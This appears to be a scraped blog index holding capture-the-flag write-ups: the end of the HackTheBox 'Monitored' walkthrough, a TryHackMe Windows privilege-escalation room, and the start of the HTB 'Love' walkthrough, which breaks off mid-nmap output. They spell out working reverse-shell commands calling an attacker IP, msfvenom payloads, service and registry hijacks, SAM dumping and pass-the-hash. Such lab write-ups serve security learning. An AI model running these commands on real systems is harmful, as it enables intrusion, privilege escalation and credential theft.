Ugh, I wish Nagios would just documen their API!! It sould save me so much trouble. I&rsquo;ve tried spinning up docker containers for NagiosXI to check the help docs from within, but they&rsquo;re all the wrong versions.
I wonder if there is a way to set jimbob as an admin user? Completely fed-up with the lack of API documentation, I did a &ldquo;hail mary&rdquo; and googled for the exact string &ldquo;/nagiosxi/api/v1/system/user&rdquo;. Much to my surprise, there was actually a result. Near the top was a reference to a Metasploit module I overlooked (EDB-ID 44969):
Looks like there were hidden parameters when creating a user! I&rsquo;ll try adding a user again, this time setting auth_level:
API_KEY=&#34;IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34; curl -k -d &#34;username=bobjim&amp;email=bobjim@monitored.htb&amp;name=bobjim&amp;password=password321&amp;auth_level=admin&amp;force_ps_change=0&#34; \\ &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=$API_KEY&amp;pretty=1&#34; It looks like they were added successfully&hellip; Let&rsquo;s try logging in now:
Whoa! That actually worked &#x1f389; I still had to set a new password on first login. The credential is bobjim : bobjim
We now have an admin login. And they can access the /nagiosxi/admin page! Now I can finally see all the API documentation, too. No more guesswork &#x1f44d;
Next, I checked out the User Management page. It allows you to masquerade as other users. Since I already knew from svc that you can see your open sessions under User Sessions, I figured it would be a good idea to check this same page as nagiosadmin:
Interesting, so nagiosadmin used /nagiosxi/includes/components/nagioscore/ui/cmd.php. I wonder if that&rsquo;s a way to gain RCE?
I saw under Help &gt; Config Reference that new commands can be registered in the system. Looking for a way to actually use the commands, I checked under Configure &gt; Core Config Manager. There is a Commands page where new commands can be defined using the UI (instead of a POST to the API):
I saw previously in the Nagios documentation that I can define pretty much any command, as long as it doesnt contain the | or % special characters. I wrote two new &ldquo;commands&rdquo;, reverse shell nc and reverse shell bash. As you might expect, this is what they do:
# Reverse shell nc nc -e /bin/bash 10.10.14.6 4444 # Reverse shell bash bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1 They have command_id 156 and 157.
So how do I use these commands? Well, registering them seems like all I can do. The Nagios documentation verifies this:
&ldquo;Nagios can process commands from external applications (including the CGIs) and alter various aspects of its monitoring functions based on the commands it receives. External applications can submit commands by writing to the command file, which is periodically processed by the Nagios daemon.&rdquo;
Hmm&hellip; If that were true, wouldn&rsquo;t I have a lot more detail from either the Host Status Summary or the Service Status Summary?
Even the service status summary is only running 11 different checks. Maybe I need to add my new checks to this dashboard somehow.
Just in case, I&rsquo;ll start up a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444,8000,9999 proto tcp socat -d TCP-LISTEN:4444 STDOUT Ahh, ok - I found how to define new checks! I needed to go to Configure &gt; Services. This page lines up exactly to the service checks detailed in the above image:
I clicked Add New and defined a new service check. Within the service check definition, I assigned it to host localhost. I also had do define the required fields max_check_attempts and notification_period (under the Check Settings and Alert Settings tabs):
There is a button at the bottom that seemingly allows me to run it right away, without waiting for the periodic check_interval. Regardless, I added both reverse_shell_bash and reverse_shell_nc in this manner, then clicked Apply Configuration.
When I looked back at my reverse shell listener, I had evidence that it was contacted! &#x1f920;
I wasn&rsquo;t sure what happened, so I re-opened the listener and waited. After a couple minutes of waiting, there was still no contact from the target. To force things along, I tried clicking that Run Check Command button on each of reverse_shell_bash and reverse_shell_nc.
It turns out that reverse_shell_nc was successful!
Immediately I checked whether this nagios user has SSH access. They do, so on my attacker box I quickly generated an SSH key to plant on the target:
# On the attacker box: ssh-keygen -t rsa -b 4096 # used passphrase &#34;wr3n&#34; chmod 700 ./id_rsa base64 -w 0 id_rsa.pub | tee id_rsa.pub64 # copy to clipboard # On the target box: cd .ssh echo &#39;c3NoL...hbGkK&#39; | base64 -d &gt;&gt; authorized_keys # On the attacker box, in a new terminal: ssh -i ./id_rsa nagios@$RADDR Then I had an SSH connection:
&#x1f602; Whew, finally. That was tough!
USER FLAG Just read it The SSH connection drops you into /home/nagios, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG User Enumeration: nagios On my attacker box, I started a python webserver to host my toolbox. Then, from the target (via SSH), I ran linpeas from memory:
# On the attacker box: ./chisel server --port 9999 --reverse &amp; # in case I want it later python3 -m http.server 8000 # On the target: curl http://10.10.14.6:8000/linpeas.sh | bash As nagios I&rsquo;m able to sudo a bunch of commands with arbitarary args. Maybe I can use argument pollution with this?
It&rsquo;s also notable that I can start, stop, and restart the nagios service. This might be especially important because the binary that the service calls is writable by nagios:
There are also a couple of writable SUID binaries:
Probably less important, but there is an ansible vault here that might be worth cracking:
Sudo nagios service Since /usr/local/nagios/bin/nagios is writable, and since it&rsquo;s called by the nagios service, it seems like a good first attempt for privesc.
sudo /etc/init.d/nagios status # sudo: /etc/init.d/nagios: command not found sudo service nagios status # Password required Hmm. Ok - That might not be possible directly. However, one of those scripts that I can sudo is called manage_services.sh:
Looks like it bundles sudo /etc/init.d and sudo service into one tool? That&rsquo;s handy. Maybe I can simply overwrite /usr/local/nagios/bin/nagios then use this manage_services.sh to restart the nagios service?
First, I&rsquo;ll need to make an executable file to replace /usr/local/nagios/bin/nagios with. For this, I&rsquo;ll write a simple script to copy bash and mark it as SUID, make_suid_bash.sh:
#!/bin/bash cp /usr/bin/bash /tmp/.Tools/bash chmod u+s /tmp/.Tools/bash Now mark rename that file and make it executable, then download it to the target:
# From the attacker: chmod +x make_suid_bash.sh mv make_suid_bash.sh nagios # From the target: cp /usr/local/nagios/bin/nagios /tmp/.Tools/nagios.bak curl -o /usr/local/nagios/bin/nagios http://10.10.14.6:8000/nagios Great, everything is in place, just restart the service, which will utilize the file we just downloaded:
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios We can see the SUID bash get created:
Now just run it, with the -p option:
./bash -p &#x1f352; All done! Just cat the flag for the points.
cat /root/root.txt &#x1f605; Wow, getting that root flag was really easy compared to getting a foothold!
LESSONS LEARNED Attacker Don&rsquo;t trust the &ldquo;vulnerable&rdquo; versions on exploits. If you see that the product you&rsquo;re attacking had notable CVEs in the past, some exploits for them might still be valid. It&rsquo;s always possible that the system you&rsquo;re attacking didn&rsquo;t actually patch the vulnerability. For this box, I used just a portion of an old exploit, one where the &ldquo;valid until&rdquo; version number was way in the past. However, the part of the exploit that I really needed was still totally valid.
Research the history of your target, even if you just skim it. Having an idea of historical vulnerabilities can be an indicator of ineffective patches. A little bit of research is still a lot faster than having to rediscover the same things yourself - you can consider it time saved.
Go fuzz yourself. Really, don&rsquo;t rely on pre-written fuzzing scripts. Think critically about what you&rsquo;re looking for, and write some targeted ffuf scans. It gets easier every time. Fuzzing skill is a huge asset, especially for picking apart poorly documented APIs.
Defender Avoid pigeonholing your organization into using old software. Nagios is getting a little &ldquo;long in the tooth&rdquo;, and is frankly a huge product. It also has a long history of severe vulnerabilities. It&rsquo;s best to avoid getting too tied to such software. Keep in mind that agility in administration is an important skill - it doesn&rsquo;t help anyone if you only know how to protect your organization using one framework or software.
Separate responsibilities for each user. Was it really essential that nagios had the ability to manage its own service? You should never grant excessive permissions or capabilities to a user that runs public-facing services! In my opinion, the nagios user should have been strictly a user of the service, with some kind of semi-admin separating its management from its operation.
Use a firewall. This box was a perfect use-case for a web application firewall, but none was in use. Moreover, I&rsquo;d recommend that a box like a Nagios server actually utilizes outgoing rules in its firewall. Once I gained any code execution at all, forming a reverse shell was a lot easier than it could have been if a WAF was in place.
`,url:"https://4wayhandshake.github.io/walkthrough/monitored/"},"https://4wayhandshake.github.io/ctf/windows-privesc/":{title:"Windows PrivEsc",tags:["SMB","Permissions","Passing the Hash","Local Enumeration","Token Impersonation"],categories:["Walkthrough","THM","Windows","Medium"],content:`INTRODUCTION While doing the HTB box Love for my my “Let’s brush up on Windows!” series, I encountered a privilege escalation technique that I had never seen. Thankfully, the technique was very clearly outlined within this TryHackMe room. Since the room contained such a useful tip, why not go complete the whole thing?
TASK 1 Deploy the VM Connect to the VPN and click the Start Machine button to start up the VM. Oddly enough, I had trouble connecting to the VPN due to the strange way openvpn parses its arguments - I had to specify which cipher to use:
sudo openvpn --data-ciphers &#39;AES-256-CBC&#39; --config /Path/to/config/file/4wayhandshake.ovpn TASK 2 Generate a Reverse Shell From the top-right of the desktop we can see the architecture:
Unless you have a reason not to, exe format is fine:
# get local IP 10.18.45.172 ip addr show tun0 # generate the reverse shell msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.45.172 LPORT=53 -f exe -o reverse.exe # Open reverse shell listener: sudo rlwrap nc -lvnp 53 Now transfer the reverse shell to the target by hosting SMB:
# Allow reverse shell and SMB through the firewall and run smb server # May need to install &#39;impacket-scripts&#39; for this: sudo ufw allow from $RADDR to any port 53,139,445 proto tcp impacket-smbserver -username &#39;kali&#39; -password &#39;testtesttest&#39; share . Now that an SMB share is hosted, use the Windows RDP connection to attach to it and download the exe. Open pwoershell and do this:
# mount the share net use x: \\\\10.18.45.172\\share /user:kali testtesttest # Now copy from x drive to somewhere local cd C:\\Users\\user\\Desktop copy X:\\reverse.exe reverse.exe # Run the exe to open the reverse shell .\\reverse.exe You should see the reverse shell open:
TASK 3 Insecure Service Permissions There is a program accesschk.exe already loaded onto the target machine. Run it to check permissions on the daclsvc service:
C:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user daclsvc RW daclsvc SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_CHANGE_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_STOP READ_CONTROL Notably, we have access to SERVICE_CHANGE_CONFIG. Query the service:
SERVICE_START_NAME : LocalSystem we see it is running as SYSTEM. There may be other services that run elevated too.
Since we can change the config of a service running as SYSTEM, let&rsquo;s just swap out the path to the binary for that service:
sc config daclsvc binpath=&#34;\\&#34;C:\\Users\\user\\Desktop\\reverse.exe\\&#34;&#34; &#x1f4a1; What we&rsquo;re doing is very similar to path abuse in Linux
Now just run the service to trip the elevated reverse shell:
net start daclsvc And there&rsquo;s the root shell.
TASK 4 Unquoted Service Path Check the services and discover that one has an unquoted BINARY_PATH_NAME:
Note that I&rsquo;m running these sc qc commands in command prompt, not powershell
sc qc unquotedsvc The path will be automatically appended with a .exe if the path does not have an extension. See Task 2 for how to transfer the reverse shell to the machine, then we can simply copy the reverse shell to the unquoted path and run the service:
copy reverse.exe &#34;C:\\Program Files\\Unquoted Path Service\\Common.exe&#34; net start unquotedsvc This should trip the elevated reverse shell:
TASK 5 Weak Registry Permissions If we have write access to a registry entry, then we might be able to exploit it. Here, we see that we have write access to regsvc:
Again, this part is done by WinPEAS and usually won&rsquo;t need to be done manually
sc qc regsvc accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentCotnrolSet\\Services\\regsvc The RW NT AUTHORITY\\INTERACTIVE means that any interactive user has read/write access to this registry entry.
To get more info on this registry entry, do a reg query:
reg query HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc To exploit, we&rsquo;ll overwrite the ImagePath. Note that the data type is REG_EXPAND_SZ, basically a string. To write a new value to that key:
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Users\\user\\Desktop\\reverse.exe /f Then, to trip the reverse shell just run the service:
net start regsvc TASK 6 Insecure Service Executables If we have write access to a registry entry, then we might be able to exploit it. Here, we see that we have write access to regsvc:
Again, this part is done by WinPEAS and usually won&rsquo;t need to be done manually
sc qc filepermsvc C:\\PrivEsc\\accesschk.exe /accepteula -quvw &#34;C:\\Program Files\\File Permissions Service\\filepermservice.exe&#34; Note that the service runs has SERVICE_START_NAME : LocalSystem, so it runs as administrator. Also, the service executable has RW Everyone with FILE_ALL_ACCESS. This means we have write permissions to the executable itself (everyone does).
To exploit, we&rsquo;ll simply overwrite the binary then start the service:
copy reverse.exe &#34;C:\\Program Files\\File Permissions Service\\filepermservice.exe&#34; net start filepermsvc TASK 7 AutoRuns Start by querying the registry to find any autorun executables:
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Check if the executable is writable:
C:\\PrivEsc\\accesschk.exe /accepteula -wvu &#34;C:\\Program Files\\Autorun Program\\program.exe&#34; It is writable by everyone. Just like in Task 6, overwrite the executable:
copy reverse.exe &#34;C:\\Program Files\\Autorun Program\\program.exe&#34; /Y This autorun executable will run when the system starts up, so just start a new session to trigger it:
Remember to start the reverse shell listener first
rdesktop $RADDR # log in with admin : password123 As noted on THM: In the real world, we&rsquo;d have to wait for an admin to log in before this executable would run.
Note that we obtained a shell as admin, not as SYSTEM.
TASK 8 AlwaysInstallElevated This is the technique that brought me to this THM room. It occurs when two registry keys are set, that cause software to use admin privileges while installing.
Check for the two registry keys (same key, but one is for Current User, the other is for Local Machine):
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Both have the value of 1, meaning they are enabled. We can exploit this by creating a .msi installer file with a reverse shell payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.45.172 LPORT=53 -f msi -o reverse.msi Download the .msi file from our attacker smb server, then run it:
cd Desktop copy X:\\reverse.msi reverse.msi msiexec /quiet /qn /i reverse.msi /i installs the msi file. /quiet /qn ensure that no UAC prompt or any other user interaction is required.
TASK 9 Passwords in Registry Sometimes, passwords are saved directly into the registry. This is how you can query the registry for a search term (in this case, &ldquo;password&rdquo; in string-type keys):
reg query HKLM /f password /t REG_SZ /s However, when I tried this, no such registry key was present.
TASK 10 Saved Credentials Sometimes credentials will be cached on a machine. We can check using this:
cmdkey /list Although we can&rsquo;t see the password directly, we can do a runas to utilize the cached credentials. In this case, I&rsquo;ll run the reverse shell:
cd Desktop runas /savecred /user:admin reverse.exe However, when I tried this, it didn&rsquo;t work. Maybe the credential timed-out or something?
TASK 11 Security Account Manager (SAM) It&rsquo;s possible you might run across a backup of the SAM. If stored insecurely, this could lead to a whole trove of NTLM hashes of everyone&rsquo;s passwords.
copy C:\\Windows\\Repair\\SAM X:\\ copy C:\\Windows\\Repair\\SYSTEM X:\\ Back on the attacker box, we can see that these are Windows registry files:
The THM room suggest we use the author&rsquo;s tool, creddump7:
&#x26a0;&#xfe0f; The author claims that copy of creddump7 preinstalled in kali is out of date and does not dump Windows 10 hashes properly. However, I think this warning itself is out of date: I tried the preinstalled version and it worked fine. Regardless, this iw what you&rsquo;d do to pull and run the latest one:
git clone https://github.com/Tib3rius/creddump7 pip3 install pycrypto python3 creddump7/pwdump.py SYSTEM SAM python3 \`locate pwdump.py\` SYSTEM SAM | tee pwdump.hashes I did a little searching for an alternative - we can also extract hashes using samdump2:
samdump2 -o outputfilename [System file] [Sam file] Note that the file sam.hashes would need a little cleaning before using it in hashcat.
Now that the NTLM hashes are extracted, run it through hashcat:
WLIST=/usr/share/wordlists/rockyou.txt hashcat -m 1000 --force pwdump.hashes $WLIST Since the passwords are so easy, they are recovered almost instantly:
TASK 12 Passing the Hash With this type of privesc, you don&rsquo;t bother cracking the hash. Instead, just use it directly. It is especially useful as a post-exploitation technique, after a tool like Mimikatz has been used to dump the hashes.
Note that kali has several pth tools:
The full &ldquo;hash&rdquo; includes both parts, the LM and NTLM hashes separated by a colon: Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
pth-winexe -U &#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39; //$RADDR cmd.exe Bonus: If your target is Windows 8.1 or Windows 2012 R2, try using xfreerdp:
Crowdstrike, on NTLM:
&ldquo;While NTLM was replaced as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains by Kerberos, it is still maintained in all Windows systems for compatibility purposes between older clients and servers. For example, computers still running Windows 95, Windows 98 or Windows NT 4.0 will use the NTLM protocol for network authentication with a Windows 2000 domain. Meanwhile, computers running Windows 2000 will use NTLM when authenticating servers with Windows NT 4.0 or earlier, as well as when accessing resources in Windows 2000 or earlier domains. NTLM is also used to authenticate local logons with non-domain controllers.&rdquo;
TASK 13 Scheduled Tasks You can find all scheduled tasks like this in cmd:
schtasks /query /fo LIST /v | findstr /i &#34;TaskName&#34; Or in Powershell:
Get-ScheduledTask Actually though, I&rsquo;m not seeing Cleanup.ps1 listed with either of these&hellip;
On this box, C:\\DevTools\\Cleanup.ps1 is running as a scheduled task that runs every minute. We can also check if the file is writable. TryHackMe directs us to check it using accesschk.exe:
C:\\PrivEsc\\accesschk.exe /accepteula -quvw user C:\\DevTools\\CleanUp.ps1 &#x1f4a1; But actually, you can also just use the built-in icacls:
icacls C:\\DevTools\\CleanUp.ps1 In icacls, you can look for the following identifiers:
Permission Description M Modify (read/write/execute and also delete) F Full Control (Like M, but you also have permission to edit permissions) I Inheritance (the Access Control Entity ACE is inherited from parent object) RX Read and Execute We see that as a member of Users we have modify permissions:
Since Cleanup.ps1 is a powershell script, we can just add a line to it. No need to completely replace it.
echo C:\\Users\\user\\Desktop\\reverse.exe &gt;&gt; C:\\DevTools\\CleanUp.ps1 (Remember to start up the reverse shell listener) then wait a minute:
Caught the reverse shell.
TASK 14 Insecure GUI Apps The VM comes with a version of Paint that runs as administrator. It should be located on the Desktop. Run it by double-clicking the shortcut.
Once it&rsquo;s open, find the program within tasklist:
tasklist /V | findstr &#34;paint&#34; Note that it&rsquo;s running as admin!
Paint can open files. So why not ask it run an executable? Try opening C:\\Windows\\System32\\cmd.exe:
&#x1f61b; Trick question - it doesn&rsquo;t work! I don&rsquo;t yet know why, but you need to switch to rdesktop instead of xfreerdp:
rdesktop -u user -p password321 $RADDR Now open Paint again and try opening cmd.exe&hellip;
Haha! Double misdirection! &#x1f46f;
We actually need to pop the correct path into the navigation bar instead:
And finally, that works:
TASK 15 Startup Apps On Windows, you can add something to startup just by pasting a link into the Start &gt; Programs &gt; StartUp folder. This VM has a pre-written VB script that does that for us. It links our reverse shell into the startup folder:
Since we don&rsquo;t have write permissions to this file, we can&rsquo;t edit the TargetPath. Instead, just copy the reverse shell over to the location it&rsquo;s expecting.
But can we even copy a link into C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup? Check the permissions:
Note that icacls showed some other permissions this time. These are folder permissions:
Permission Description OI Object Inherit. Objects (files) within this container (folder) will inherit ACE (perms) of the container. CI Container Inherit. Subcontainers (subfolders) within this folder will inherit the ACE of this folder. DE The ACE does not get inherited by objects within this container (folder). DC Same as DE, but don&rsquo;t even allow the ACE to be displayed in inherited ACL entries Since the Users group has F full control, the OI and CI flags mean that we have full control over all contents too. So yeah, we can write to it.
We can run the VB script using cscript, which is just a Windows utility for running scripts:
cscript C:\\PrivEsc\\CreateShortcut.vbs Again, since this just adds something to startup, we&rsquo;d normally need to wait for an administrator (or any other user) to log onto the system to trigger the reverse shell. However, since we already &ldquo;obtained&rdquo; creds (see Task 11), let&rsquo;s just force it to happen by logging on as the administrator over RDP:
Remember to start the reverse shell listener
rdesktop -u admin -p password123 $RADDR And a few seconds after connecting as admin, we get the reverse shell:
TASK 16 Token Impersonation (Rogue Potato) This is for Windows Local Privilege Escalation from Service Account to System
There are a bunch of different potatoes. Each was relevant at a different time, and it&rsquo;s hard to keep straight. I found a really helpful resource was this page, by Jorge Lajara. As of 2020, this is their guideline:
The images shown below are from their website. Go check it out! It has really good details.
┌───────────┐ Good for any │ SWEET │ Windows version │ Potato │ └─────┬─────┘ │ &gt;= Windows 10 1809 or ┌──────────┴─────────┐ &lt; Windows 10 1809 or Windows Server 2019 ▼ ▼ &lt; Windows Server 2019 ┌───────────┐ ┌───────────┐ │ ROGUE │ │ JUICY │ │ Potato │ │ Potato │ └───────────┘ └───────────┘ Hot Potato was the earliest version of this, and is easiest to understand. It&rsquo;s like a MITM attack with Windows Update:
Rogue Potato is a little more confusing and works by a different mechanism. The preconditions are these:
You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections. Again, this material is from https://jlajara.gitlab.io/Potatoes_Windows_Privesc by Jorge Lajara. Go check that page for more detail, it&rsquo;s summarized really well &#x1f44d;
0xdf&rsquo;s guide on the HTB box Remote is another good resource.
To perform RoguePotato, start open powershell as the admin user on the target. Open the RDP connection:
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.83.41 Then open an elevated cmd session by finding Command Prompt from the launcher, right click, More, run as Administrator. At the prompt, enter the credentials admin : password123.
On attacker machine, run a socat redirector for SMB 135 &ndash;&gt; Target&rsquo;s port 9999:
sudo ufw allow from 10.10.83.41 to any port 53,135 proto tcp sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.83.41:9999 rlwrap nc -lvnp 53 Normally, you&rsquo;d need to find a way to get the RoguePotato binary onto the target. For us, it&rsquo;s already present. On the target machine, open a new reverse shell.
Our reverse.exe (from Task 2) uses port 53 and the exploit uses SMB 135. The target needs to be able to listen on a certain port (we use 9999).
C:\\PrivEsc\\PSExec64.exe -i -u &#34;nt authority\\local service&#34; C:\\PrivEsc\\reverse.exe TASK 17 Token Impersonation (PrintSpoofer) PrintSpoofer.exe is used for privilege escalation from a service account (nt authority\\local service) to full admin (nt authority\\system)
Log in and create a reverse shell using reverse.exe, exactly the same as we just did in Task 16. Again, normally we&rsquo;d need to find a way to get the exploit onto the target, but on this box it&rsquo;s already present. If you do it just like before, this will grant a reverse shell as nt authority\\local service.
Now open up a second reverse shell listener: this one is what we&rsquo;ll use to catch a shell as nt authority\\system:
Thankfully, TCP allows us to open multiple reverse shells on the same port &#x1f609;
rlwrap nc -lvnp 53 Now, using the nt authority\\local service reverse shell, trigger the exploit:
C:\\PrivEsc\\PrintSpoofer.exe -c &#34;C:\\PrivEsc\\reverse.exe&#34; -i Then, in the second reverse shell, you&rsquo;ll see a new connection as nt authority\\system:
Crazy!
TASK 18 Privilege Escalation Scripts This THM room showcases the following privesc scripts:
winPEASany.exe Seatbelt.exe PowerUp.ps1 SharpUp.exe They are all present in C:\\PrivEsc. Just try them all - compare and contrast.
WinPEAS We all know WinPEAS. It&rsquo;s great!
As far as I can tell, this is the only one that found the InstallAlwaysElevated and the SAM backup files. Like the others, it found modifiable services, and vulnerable permissions. It also found an additional unquoted service path that wasn&rsquo;t even part of this THM room.
10/10 would privesc again.
Seatbelt.exe See the Github repo for a lot more info. Seems pretty cool. You can run it at different levels of scope. For example:
Seatbelt.exe user Seatbelt.exe system It seems really fast. Mostly it does local enumeration (it doesn&rsquo;t really provide a confidence level for how likely its findings are for privesc). Does things like pointing out non-Windows services, autoruns, things like that. Could be a very useful tool for speeding up enumeration.
PowerUp.ps1 PowerUp is archived, but WOW it seems really good
Import-Module .\\PowerUp.ps1 Invoke-AllChecks # Run ALL checks Get-ModifiableServiceFile #run only checks for modifiable services Even the Invoke-AllChecks mode does a really good job of showing only actionable privesc vectors. Definitely use this one! The results are a lot shorter than Seatbelt, but with far less false-positives.
SharpUp.exe Produces really thinned-down results. It actually caught quite a few of the privesc vectors in this room though. Don&rsquo;t discount this one if you want some really quick and easy-to-interpret results
.\\SharpUp.exe audit Here&rsquo;s the whole report:
=== Modifiable Services === Name : daclsvc DisplayName : DACL Service Description : State : Stopped StartMode : Manual PathName : &#34;C:\\Program Files\\DACL Service\\daclservice.exe&#34; Name : UsoSvc DisplayName : Update Orchestrator Service Description : Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates. State : Running StartMode : Auto PathName : C:\\Windows\\system32\\svchost.exe -k netsvcs -p === Modifiable Service Binaries === Name : filepermsvc DisplayName : File Permissions Service Description : State : Stopped StartMode : Manual PathName : &#34;C:\\Program Files\\File Permissions Service\\filepermservice.exe&#34; === AlwaysInstallElevated Registry Keys === HKLM: 1 === Modifiable Folders in %PATH% === Modifable %PATH% Folder : C:\\Temp === Modifiable Registry Autoruns === HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run : C:\\Program Files\\Autorun Program\\program.exe === *Special* User Privileges === SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED === Unattended Install Files === C:\\Windows\\Panther\\Unattend.xml === Cached GPP Password === [X] Exception: Could not find a part of the path &#39;C:\\ProgramData\\Microsoft\\Group Policy\\History&#39;. Not bad!
CONCLUSION Congratulations on finishing the TryHackMe room. I gained a lot of insight from this room, and have some good notes that I think I&rsquo;ll reference often. It was a fantastic room, and now I&rsquo;m confident that I can run some privesc scripts, interpret them properly, and action them into a way to reach local admin.
`,url:"https://4wayhandshake.github.io/ctf/windows-privesc/"},"https://4wayhandshake.github.io/walkthrough/love/":{title:"Love",tags:["SSRF","LFI","Insecure Upload","WinRM","AlwaysInstallElevated","MSFVenom"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION It&rsquo;s been a week, but now it&rsquo;s time to get back into my “Let’s brush up on Windows!” series. Love is the fifth box, following Toolbox. This box was pretty interesting, definitely worth checking out. I really enjoyed that it avoided the whole &ldquo;Find the CVE and exploit it&rdquo; pattern that many Easy boxes use.
It revolves around a &ldquo;File Scanner&rdquo; web app with some terrible security misconfigurations and mistakes. Can you find them all?
Without too much recon, you&rsquo;ll come across the vulnerable website. It has an LFI that can be used to nab whatever configuration files you desire. While the LFI is enough to gain a foothold by itself, you can actually utilize it as an SSRF obtain another credential. From there, some very simple enumeration will pretty clearly point out the vulnerability you need to exploit to gain the root flag. It&rsquo;s a very easy exploit that shouldn&rsquo;t take more than a couple minutes if done properly.
I didn&rsquo;t realize it at the time, but it turns out that the way I used the LFI (to gain a foothold) was actually quite rare. From the few walkthroughs I checked after completing this box, I didn&rsquo;t see any others using the LFI to gain a foothold (circumventing the SSRF). Read the Root Flag section for more details!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 5000/tcp open upnp 5040/tcp open unknown 5985/tcp open wsman 7680/tcp open pando-pub 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | DNSStatusRequestTCP, GetRequest, NULL, SMBProgNeg: |_ Host &#39;10.10.14.3&#39; is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after: 2024-04-10T14:39:19 |_http-server-header: Microsoft-HTTPAPI/2.0 |_ssl-date: 2024-02-22T05:49:18+00:00; +22m13s from scanner time. 7680/tcp open pando-pub? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Host script results: | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 